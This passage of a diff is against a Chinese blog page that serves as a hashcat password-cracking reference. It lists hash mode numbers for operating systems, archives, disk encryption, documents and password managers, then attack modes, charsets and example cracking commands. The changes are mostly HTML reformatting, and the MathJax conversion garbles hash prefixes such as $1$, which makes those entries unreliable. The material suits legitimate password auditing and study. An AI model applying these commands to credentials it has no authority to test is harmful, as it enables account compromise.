+<tr class="even">
 <td>12400</td>
 <td>BSDiCrypt, Extended DES</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>500</td>
-<td>md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)</td>
+<td>md5crypt, MD5 (Unix), Cisco-IOS <span class="math inline">\(1\)</span> (MD5)</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>3200</td>
-<td>bcrypt $2*$, Blowfish (Unix)</td>
+<td>bcrypt <span class="math inline">\(2*\)</span>, Blowfish (Unix)</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>7400</td>
-<td>sha256crypt $5$, SHA256 (Unix)</td>
+<td>sha256crypt <span class="math inline">\(5\)</span>, SHA256 (Unix)</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>1800</td>
-<td>sha512crypt $6$, SHA512 (Unix)</td>
+<td>sha512crypt <span class="math inline">\(6\)</span>, SHA512 (Unix)</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>122</td>
 <td>OSX v10.4, OSX v10.5, OSX v10.6</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>1722</td>
 <td>OSX v10.7</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>7100</td>
 <td>OSX v10.8+ (PBKDF2-SHA512)</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>6300</td>
 <td>AIX {smd5}</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>6700</td>
 <td>AIX {ssha1}</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>6400</td>
 <td>AIX {ssha256}</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>6500</td>
 <td>AIX {ssha512}</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>2400</td>
 <td>Cisco-PIX MD5</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>2410</td>
 <td>Cisco-ASA MD5</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>500</td>
-<td>Cisco-IOS $1$ (MD5)</td>
+<td>Cisco-IOS <span class="math inline">\(1\)</span> (MD5)</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>5700</td>
 <td>Cisco-IOS type 4 (SHA256)</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>9200</td>
-<td>Cisco-IOS $8$ (PBKDF2-SHA256)</td>
+<td>Cisco-IOS <span class="math inline">\(8\)</span> (PBKDF2-SHA256)</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>9300</td>
-<td>Cisco-IOS $9$ (scrypt)</td>
+<td>Cisco-IOS <span class="math inline">\(9\)</span> (scrypt)</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>22</td>
 <td>Juniper NetScreen/SSG (ScreenOS)</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>501</td>
 <td>Juniper IVE</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>15100</td>
 <td>Juniper/NetBSD sha1crypt</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>7000</td>
 <td>FortiGate (FortiOS)</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>5800</td>
 <td>Samsung Android Password/PIN</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>13800</td>
 <td>Windows Phone 8+ PIN/password</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>8100</td>
 <td>Citrix NetScaler</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>8500</td>
 <td>RACF</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>7200</td>
 <td>GRUB 2</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>9900</td>
 <td>Radmin2</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="even">
 <td>125</td>
 <td>ArubaOS</td>
 <td>操作系统</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>7700</td>
 <td>SAP CODVN B (BCODE)</td>
 <td>企业应用软件（EAS）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>7800</td>
 <td>SAP CODVN F/G (PASSCODE)</td>
 <td>企业应用软件（EAS）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>10300</td>
 <td>SAP CODVN H (PWDSALTEDHASH) iSSHA-1</td>
 <td>企业应用软件（EAS）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>8600</td>
 <td>Lotus Notes/Domino 5</td>
 <td>企业应用软件（EAS）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>8700</td>
 <td>Lotus Notes/Domino 6</td>
 <td>企业应用软件（EAS）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>9100</td>
 <td>Lotus Notes/Domino 8</td>
 <td>企业应用软件（EAS）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>133</td>
 <td>PeopleSoft</td>
 <td>企业应用软件（EAS）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>13500</td>
 <td>PeopleSoft PS_TOKEN</td>
 <td>企业应用软件（EAS）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>11600</td>
 <td>7-Zip</td>
 <td>压缩/存档</td>
 </tr>
-<tr>
+<tr class="even">
 <td>12500</td>
 <td>RAR3-hp</td>
 <td>压缩/存档</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>13000</td>
 <td>RAR5</td>
 <td>压缩/存档</td>
 </tr>
-<tr>
+<tr class="even">
 <td>13200</td>
 <td>AxCrypt</td>
 <td>压缩/存档</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>13300</td>
 <td>AxCrypt in-memory SHA1</td>
 <td>压缩/存档</td>
 </tr>
-<tr>
+<tr class="even">
 <td>13600</td>
 <td>WinZip</td>
 <td>压缩/存档</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>14700</td>
 <td>iTunes 备份 &lt; 10.0</td>
 <td>备份</td>
 </tr>
-<tr>
+<tr class="even">
 <td>14800</td>
 <td>iTunes 备份 &gt;= 10.0</td>
 <td>备份</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>62XY</td>
 <td>TrueCrypt</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>X</td>
 <td>1 = PBKDF2-HMAC-RIPEMD160</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>X</td>
 <td>2 = PBKDF2-HMAC-SHA512</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>X</td>
 <td>3 = PBKDF2-HMAC-Whirlpool</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>X</td>
 <td>4 = PBKDF2-HMAC-RIPEMD160 + boot-mode</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Y</td>
-<td>1 = XTS  512 bit pure AES</td>
+<td>1 = XTS 512 bit pure AES</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Y</td>
-<td>1 = XTS  512 bit pure Serpent</td>
+<td>1 = XTS 512 bit pure Serpent</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Y</td>
-<td>1 = XTS  512 bit pure Twofish</td>
+<td>1 = XTS 512 bit pure Twofish</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Y</td>
 <td>2 = XTS 1024 bit pure AES</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Y</td>
 <td>2 = XTS 1024 bit pure Serpent</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Y</td>
 <td>2 = XTS 1024 bit pure Twofish</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Y</td>
 <td>2 = XTS 1024 bit cascaded AES-Twofish</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Y</td>
 <td>2 = XTS 1024 bit cascaded Serpent-AES</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Y</td>
 <td>2 = XTS 1024 bit cascaded Twofish-Serpent</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Y</td>
 <td>3 = XTS 1536 bit all</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>8800</td>
 <td>Android FDE &lt;= 4.3</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>12900</td>
 <td>Android FDE (Samsung DEK)</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>12200</td>
 <td>eCryptfs</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>137XY</td>
 <td>VeraCrypt</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>X</td>
 <td>1 = PBKDF2-HMAC-RIPEMD160</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>X</td>
 <td>2 = PBKDF2-HMAC-SHA512</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>X</td>
 <td>3 = PBKDF2-HMAC-Whirlpool</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>X</td>
 <td>4 = PBKDF2-HMAC-RIPEMD160 + boot-mode</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>X</td>
 <td>5 = PBKDF2-HMAC-SHA256</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>X</td>
 <td>6 = PBKDF2-HMAC-SHA256 + boot-mode</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Y</td>
-<td>1 = XTS  512 bit pure AES</td>
+<td>1 = XTS 512 bit pure AES</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Y</td>
-<td>1 = XTS  512 bit pure Serpent</td>
+<td>1 = XTS 512 bit pure Serpent</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Y</td>
-<td>1 = XTS  512 bit pure Twofish</td>
+<td>1 = XTS 512 bit pure Twofish</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Y</td>
 <td>2 = XTS 1024 bit pure AES</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Y</td>
 <td>2 = XTS 1024 bit pure Serpent</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Y</td>
 <td>2 = XTS 1024 bit pure Twofish</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Y</td>
 <td>2 = XTS 1024 bit cascaded AES-Twofish</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Y</td>
 <td>2 = XTS 1024 bit cascaded Serpent-AES</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Y</td>
 <td>2 = XTS 1024 bit cascaded Twofish-Serpent</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Y</td>
 <td>3 = XTS 1536 bit all</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="even">
 <td>14600</td>
 <td>LUKS</td>
 <td>全盘加密（FDE）</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>9700</td>
 <td>MS Office &lt;= 2003 $0/$1, MD5 + RC4</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="even">
 <td>9710</td>
 <td>MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #1</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>9720</td>
 <td>MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #2</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="even">
 <td>9800</td>
 <td>MS Office &lt;= 2003 $3/$4, SHA1 + RC4</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>9810</td>
 <td>MS Office &lt;= 2003 $3/$4, SHA1 + RC4, collider #1</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="even">
 <td>9820</td>
 <td>MS Office &lt;= 2003 $3/$4, SHA1 + RC4, collider #2</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>9400</td>
 <td>MS Office 2007</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="even">
 <td>9500</td>
 <td>MS Office 2010</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>9600</td>
 <td>MS Office 2013</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="even">
 <td>10400</td>
 <td>PDF 1.1 - 1.3 (Acrobat 2 - 4)</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>10410</td>
 <td>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="even">
 <td>10420</td>
 <td>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>10500</td>
 <td>PDF 1.4 - 1.6 (Acrobat 5 - 8)</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="even">
 <td>10600</td>
 <td>PDF 1.7 Level 3 (Acrobat 9)</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>10700</td>
 <td>PDF 1.7 Level 8 (Acrobat 10 - 11)</td>
 <td>文档</td>
 </tr>
-<tr>
+<tr class="even">
 <td>9000</td>
 <td>Password Safe v2</td>
 <td>密码管理软件</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>5200</td>
 <td>Password Safe v3</td>
 <td>密码管理软件</td>
 </tr>
-<tr>
+<tr class="even">
 <td>6800</td>
 <td>LastPass + LastPass sniffed</td>
 <td>密码管理软件</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>6600</td>
 <td>1Password, agilekeychain</td>
 <td>密码管理软件</td>
 </tr>
-<tr>
+<tr class="even">
 <td>8200</td>
 <td>1Password, cloudkeychain</td>
 <td>密码管理软件</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>11300</td>
 <td>Bitcoin/Litecoin wallet.dat</td>
 <td>密码管理软件</td>
 </tr>
-<tr>
+<tr class="even">
 <td>12700</td>
 <td>Blockchain, My Wallet</td>
 <td>密码管理软件</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>13400</td>
 <td>KeePass 1 (AES/Twofish) and KeePass 2 (AES)</td>
 <td>密码管理软件</td>
 </tr>
-<tr>
+<tr class="even">
 <td>99999</td>
 <td>Plaintext</td>
 <td>Blockchain明文，我的钱包</td>
 </tr>
-</tbody></table>
-<h3 id="③-输出格式"><a href="#③-输出格式" class="headerlink" title="③ 输出格式"></a>③ 输出格式</h3><table>
+</tbody>
+</table>
+<h3 id="输出格式">③ 输出格式</h3>
+<table>
 <thead>
-<tr>
+<tr class="header">
 <th>编号</th>
 <th>格式</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td>1</td>
 <td>hash[:salt]</td>
 </tr>
-<tr>
+<tr class="even">
 <td>2</td>
 <td>plain</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>3</td>
 <td>hash[:salt]:plain</td>
 </tr>
-<tr>
+<tr class="even">
 <td>4</td>
 <td>hex_plain</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>5</td>
 <td>hash[:salt]:hex_plain</td>
 </tr>
-<tr>
+<tr class="even">
 <td>6</td>
 <td>plain:hex_plain</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>7</td>
 <td>hash[:salt]:plain:hex_plain</td>
 </tr>
-<tr>
+<tr class="even">
 <td>8</td>
 <td>crackpos</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>9</td>
 <td>hash[:salt]:crack_pos</td>
 </tr>
-<tr>
+<tr class="even">
 <td>10</td>
 <td>plain:crack_pos</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>11</td>
 <td>hash[:salt]:plain:crack_pos</td>
 </tr>
-<tr>
+<tr class="even">
 <td>12</td>
 <td>hex_plain:crack_pos</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>13</td>
 <td>hash[:salt]:hex_plain:crack_pos</td>
 </tr>
-<tr>
+<tr class="even">
 <td>14</td>
 <td>plain:hex_plain:crack_pos</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>15</td>
 <td>hash[:salt]:plain:hex_plain:crack_pos</td>
 </tr>
-</tbody></table>
-<h3 id="④-调试模式规则"><a href="#④-调试模式规则" class="headerlink" title="④ 调试模式规则"></a>④ 调试模式规则</h3><table>
+</tbody>
+</table>
+<h3 id="调试模式规则">④ 调试模式规则</h3>
+<table>
 <thead>
-<tr>
+<tr class="header">
 <th>编号</th>
 <th>格式</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td>1</td>
 <td>查找规则</td>
 </tr>
-<tr>
+<tr class="even">
 <td>2</td>
 <td>原始词</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>3</td>
 <td>原始词:查找规则</td>
 </tr>
-<tr>
+<tr class="even">
 <td>4</td>
 <td>原始词:查找规则:已处理词</td>
 </tr>
-</tbody></table>
-<h3 id="⑤-攻击模式"><a href="#⑤-攻击模式" class="headerlink" title="⑤ 攻击模式"></a>⑤ 攻击模式</h3><table>
+</tbody>
+</table>
+<h3 id="攻击模式">⑤ 攻击模式</h3>
+<table>
 <thead>
-<tr>
+<tr class="header">
 <th>编号</th>
 <th>模式</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td>0</td>
 <td>直接</td>
 </tr>
-<tr>
+<tr class="even">
 <td>1</td>
 <td>组合</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>3</td>
 <td>暴力穷举</td>
 </tr>
-<tr>
+<tr class="even">
 <td>6</td>
 <td>混合 字典 + 掩码</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>7</td>
 <td>混合 掩码 + 字典</td>
 </tr>
-</tbody></table>
-<h3 id="⑥-内置字符集"><a href="#⑥-内置字符集" class="headerlink" title="⑥ 内置字符集"></a>⑥ 内置字符集</h3><table>
+</tbody>
+</table>
+<h3 id="内置字符集">⑥ 内置字符集</h3>
+<table>
 <thead>
-<tr>
+<tr class="header">
 <th>?</th>
 <th>字符集</th>
 <th></th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td>l</td>
 <td>abcdefghijklmnopqrstuvwxyz</td>
 <td></td>
 </tr>
-<tr>
+<tr class="even">
 <td>u</td>
 <td>ABCDEFGHIJKLMNOPQRSTUVWXYZ</td>
 <td></td>
 </tr>
-<tr>
+<tr class="odd">
 <td>d</td>
 <td>0123456789</td>
 <td></td>
 </tr>
-<tr>
+<tr class="even">
 <td>h</td>
 <td>0123456789abcdef</td>
 <td></td>
 </tr>
-<tr>
+<tr class="odd">
 <td>H</td>
 <td>0123456789ABCDEF</td>
 <td></td>
 </tr>
-<tr>
+<tr class="even">
 <td>s</td>
-<td>!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{</td>
+<td>!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[]^_`{</td>
 <td>}~</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>a</td>
 <td>?l?u?d?s</td>
 <td></td>
 </tr>
-<tr>
+<tr class="even">
 <td>b</td>
 <td>0x00 - 0xff</td>
 <td></td>
 </tr>
-</tbody></table>
-<h3 id="⑦-OpenCL设备类型"><a href="#⑦-OpenCL设备类型" class="headerlink" title="⑦ OpenCL设备类型"></a>⑦ OpenCL设备类型</h3><table>
+</tbody>
+</table>
+<h3 id="opencl设备类型">⑦ OpenCL设备类型</h3>
+<table>
 <thead>
-<tr>
+<tr class="header">
 <th>编号</th>
 <th>设备类型</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td>1</td>
 <td>CPU</td>
 </tr>
-<tr>
+<tr class="even">
 <td>2</td>
 <td>GPU</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>3</td>
 <td>现场可编程门阵列(FPGA)，数字信号处理器(DSP)，协处理器(Co-Processor)</td>
 </tr>
-</tbody></table>
-<h3 id="⑧-工作负载配置文件"><a href="#⑧-工作负载配置文件" class="headerlink" title="⑧ 工作负载配置文件"></a>⑧ 工作负载配置文件</h3><table>
+</tbody>
+</table>
+<h3 id="工作负载配置文件">⑧ 工作负载配置文件</h3>
+<table>
 <thead>
-<tr>
+<tr class="header">
 <th>编号</th>
 <th>性能</th>
 <th>运行时间</th>
@@ -2199,64 +2132,74 @@
 <th>桌面影响</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td>1</td>
 <td>低</td>
 <td>2 ms</td>
 <td>低</td>
 <td>最小</td>
 </tr>
-<tr>
+<tr class="even">
 <td>2</td>
 <td>默认</td>
 <td>12 ms</td>
 <td>经济型</td>
 <td>可察觉</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>3</td>
 <td>高</td>
 <td>96 ms</td>
 <td>高</td>
 <td>没有反应</td>
 </tr>
-<tr>
+<tr class="even">
 <td>4</td>
 <td>噩梦</td>
 <td>480 ms</td>
 <td>疯狂的</td>
 <td>无法控制</td>
 </tr>
-</tbody></table>
-<h3 id="⑨-基本用例"><a href="#⑨-基本用例" class="headerlink" title="⑨ 基本用例"></a>⑨ 基本用例</h3><table>
+</tbody>
+</table>
+<h3 id="基本用例">⑨ 基本用例</h3>
+<table>
+<colgroup>
+<col style="width: 11%">
+<col style="width: 10%">
+<col style="width: 77%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>攻击模式</th>
 <th>Hash种类</th>
 <th>示例命令</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td>字典</td>
-<td>$P$</td>
+<td><span class="math inline">\(P\)</span></td>
 <td>hashcat -a 0 -m 400 example400.hash example.dict</td>
 </tr>
-<tr>
+<tr class="even">
 <td>字典+规则</td>
 <td>MD5</td>
 <td>hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>暴力穷举</td>
 <td>MD5</td>
 <td>hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a</td>
 </tr>
-<tr>
+<tr class="even">
 <td>组合</td>
 <td>MD5</td>
 <td>hashcat -a 1 -m 0 example0.hash example.dict example.dict</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 
       
 
@@ -2409,7 +2352,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-配置环境"><span class="toc-number">1.</span> <span class="toc-text">0x00 配置环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-安装系统"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 安装系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-安装GPU驱动"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 安装GPU驱动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-安装hashcat"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 安装hashcat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-Crack实战"><span class="toc-number">2.</span> <span class="toc-text">0x10 Crack实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-初始配置"><span class="toc-number">2.1.</span> <span class="toc-text">0x11 初始配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-实施攻击"><span class="toc-number">2.2.</span> <span class="toc-text">0x12 实施攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-开始爆破"><span class="toc-number">3.</span> <span class="toc-text">0x20 开始爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#附录一"><span class="toc-number">5.</span> <span class="toc-text">附录一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#①-hashcat选项解释"><span class="toc-number">5.1.</span> <span class="toc-text">① hashcat选项解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#②-Hash种类"><span class="toc-number">5.2.</span> <span class="toc-text">② Hash种类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#③-输出格式"><span class="toc-number">5.3.</span> <span class="toc-text">③ 输出格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#④-调试模式规则"><span class="toc-number">5.4.</span> <span class="toc-text">④ 调试模式规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#⑤-攻击模式"><span class="toc-number">5.5.</span> <span class="toc-text">⑤ 攻击模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#⑥-内置字符集"><span class="toc-number">5.6.</span> <span class="toc-text">⑥ 内置字符集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#⑦-OpenCL设备类型"><span class="toc-number">5.7.</span> <span class="toc-text">⑦ OpenCL设备类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#⑧-工作负载配置文件"><span class="toc-number">5.8.</span> <span class="toc-text">⑧ 工作负载配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#⑨-基本用例"><span class="toc-number">5.9.</span> <span class="toc-text">⑨ 基本用例</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#x00-配置环境"><span class="toc-number">1.</span> <span class="toc-text">0x00 配置环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x01-安装系统"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 安装系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x02-安装gpu驱动"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 安装GPU驱动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x03-安装hashcat"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 安装hashcat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x10-crack实战"><span class="toc-number">2.</span> <span class="toc-text">0x10 Crack实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x11-初始配置"><span class="toc-number">2.1.</span> <span class="toc-text">0x11 初始配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x12-实施攻击"><span class="toc-number">2.2.</span> <span class="toc-text">0x12 实施攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x20-开始爆破"><span class="toc-number">3.</span> <span class="toc-text">0x20 开始爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#附录一"><span class="toc-number">5.</span> <span class="toc-text">附录一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hashcat选项解释"><span class="toc-number">5.1.</span> <span class="toc-text">① hashcat选项解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash种类"><span class="toc-number">5.2.</span> <span class="toc-text">② Hash种类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输出格式"><span class="toc-number">5.3.</span> <span class="toc-text">③ 输出格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试模式规则"><span class="toc-number">5.4.</span> <span class="toc-text">④ 调试模式规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击模式"><span class="toc-number">5.5.</span> <span class="toc-text">⑤ 攻击模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内置字符集"><span class="toc-number">5.6.</span> <span class="toc-text">⑥ 内置字符集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#opencl设备类型"><span class="toc-number">5.7.</span> <span class="toc-text">⑦ OpenCL设备类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#工作负载配置文件"><span class="toc-number">5.8.</span> <span class="toc-text">⑧ 工作负载配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本用例"><span class="toc-number">5.9.</span> <span class="toc-text">⑨ 基本用例</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -2754,6 +2697,23 @@ var _hmt = _hmt || [];
     </div>
 
 </div>
-  </div>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
